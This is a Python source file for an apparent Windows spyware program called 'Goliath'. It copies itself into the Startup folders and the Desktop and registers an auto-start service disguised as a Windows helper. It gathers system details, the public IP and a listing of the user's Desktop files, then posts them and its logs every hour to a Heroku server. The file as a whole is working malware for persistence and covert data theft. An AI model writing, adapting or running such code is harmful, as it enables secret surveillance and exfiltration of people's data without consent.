import os
import sys
import shutil
import subprocess
import platform
import time
import shlex
import checksumdir
import fluffylog
from threading import Thread
from fluffyreq import post_json_to_server, get_host_ip

# Create log instance
log = fluffylog.FluffyLog()
log.info('Goliath On line...')


# Necessary variables
WIN7_COMMON_STARTUP =\
    'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
WIN7_USER_STARTUP =\
    os.path.join(
        os.path.expanduser("~"),
        '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
MAIN_DATA_URL = 'https://tranquil-caverns-83807.herokuapp.com/json'
LOG_URL = 'https://tranquil-caverns-83807.herokuapp.com/logs'
USER_HOME = os.path.expanduser("~\Desktop")
MYSELF = os.path.basename(sys.argv[0])
LOCK_FILE = '{}'.format(os.path.join(os.path.expanduser('~'), 'WinHelp.lock'))
SC_LINE = '''sc create SuperAwesomeWindowsHelper
binPath= "{}"
DisplayName= "WinHelper"
start= auto'''.format(os.path.join(USER_HOME, MYSELF))
WHATS_MY_IP = 'http://ipv4bot.whatismyipaddress.com/'


# Functions
def copy_to_dir(dir_path):
    if os.path.isfile(os.path.join(dir_path, MYSELF)):
        log.debug("I'm already in ({}), skipping".format(dir_path))
    else:
        if os.path.exists(dir_path):
            shutil.copy(sys.argv[0], dir_path)
            log.debug('Copied itself to ({})'.format(dir_path))
        else:
            os.mkdir(dir_path)
            log.warning('Dir does not exist, creating ({})'.format(dir_path))
            shutil.copy(sys.argv[0], dir_path)
            log.debug('Copied itself to ({})'.format(dir_path))


def copy_to_startup():
    try:
        copy_to_dir(WIN7_COMMON_STARTUP)
    except Exception as e:
        raise e
        copy_to_dir(WIN7_USER_STARTUP)


def copy_to_user_dir():
    try:
        copy_to_dir(USER_HOME)
    except Exception as e:
        raise e


def check_lock():
    try:
        if os.path.isfile(LOCK_FILE):
            os.remove(LOCK_FILE)
        os.open(LOCK_FILE, os.O_CREAT | os.O_EXCL | os.O_RDWR)
    except OSError:
        exit()


def gather_pc_info():
    pc_info = platform.uname()
    pc_data = {'kind': 'PC info', 'data': {
        'Name': pc_info.node,
        'System': pc_info.system,
        'Version': pc_info.version,
        'Release': pc_info.release,
        'Machine': pc_info.machine,
        'Processor': pc_info.processor
    }}

    return pc_data


def gather_dir_info(dir_path):
    file_data = {'kind': 'User path data', 'data': []}
    if os.path.isdir(dir_path):
        log.info('Started dir info ({})'.format(dir_path))
        all_files = []
        c = os.walk(dir_path)
        for root, dirs, files in c:
            dir_files = []
            for f in files:
                if os.path.isfile(os.path.join(root, f)):
                    stat = os.stat(os.path.join(root, f))
                    dir_files.append({'name': f, 'stats': stat})
            # wait for 2 seconds on every folder, so cpu is not taxed
            time.sleep(2)
            all_files.append({'folder': root, 'files': dir_files})
        file_data.update({'data': all_files})
        log.info('Finished dir info ({})'.format(dir_path))
        log.debug('Rows of data ({})'.format(len(all_files)))
    else:
        log.warning('Path is not a directory ({})'.format(dir_path))
        log.debug('Returning empty list')

    return {'file_data': file_data}


# Launch a new thread for stdout and stderr
def threaded_output(std_out, std_err):
    def f():
        try:
            if std_out:
                for o_line in std_out:
                    log.info('{!r}'.format(o_line))
            if std_err:
                for e_line in std_err:
                    log.warning('{!r}'.format(e_line))
        except Exception as e:
            raise e
        finally:
            std_out.close()
            std_err.close()
    t = Thread(target=f)
    t.deamon = True
    t.start()


# Launch a command line string
def run_cmd(line):
    args = shlex.split(line)

    log.debug('Launching a subprocess: "{!s}"'.format(line))

    try:
        cmd_process = subprocess.Popen(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            bufsize=1,
        )
        # Close stdin, workaround for threaded output
        cmd_process.stdin.close()

        # Output in a separate thread to prevent deadlock
        threaded_output(cmd_process.stdout, cmd_process.stderr)

        # Wait for 30 seconds for subprocess to exit, otherwise kill it
        exec_tol = time.time() + 30
        while cmd_process.poll() is None:
            time.sleep(.5)
            if exec_tol < time.time():
                break

        log.debug('Subprocess return code: {}'.format(cmd_process.poll()))
    except (OSError, subprocess.CalledProcessError) as e:
        log.warrning('Exception occurred: {}'.format(e))
        log.info('Subprocess failed')
        return False
        raise
    else:
        log.info('Subprocess finished')
        cmd_process.kill()
    return True


# Main function
def main():
    check_lock()
    while True:
        try:
            next_call = time.time()
            ip_req_response = get_host_ip(WHATS_MY_IP)
            # TODO: Merge with file search
            md5hash = checksumdir.dirhash(USER_HOME, 'md5')

            copy_to_startup()
            copy_to_user_dir()
            run_cmd(SC_LINE)
            pc_i = gather_pc_info()
            dir_i = gather_dir_info(USER_HOME)
            all_data = {'ip': ip_req_response['ip'],
                        'pc_data': pc_i,
                        'file_data': dir_i,
                        'USER_HOME_hash': md5hash}

            log.debug('Sending data to ({})'.format(MAIN_DATA_URL))
            resp = post_json_to_server(MAIN_DATA_URL, all_data)

            if resp == -1:
                log.warning('Sending failed')
            else:
                log.debug('Json sent, response ({})'.format(resp))

        except Exception as e:
            log.error('Unknown exception found:\n({0})'.format(e))
        finally:
            log.info('Sending log to server')
            log.debug('End of loop, will wait for {} seconds'.format(3600))
            log.flush(LOG_URL)

            next_call = next_call + int(3600)
            if (next_call - time.time()) <= 0:
                time.sleep(1)
            else:
                time.sleep(next_call - time.time())


if __name__ == '__main__':
    timerThread = Thread(target=main)
    timerThread.start()
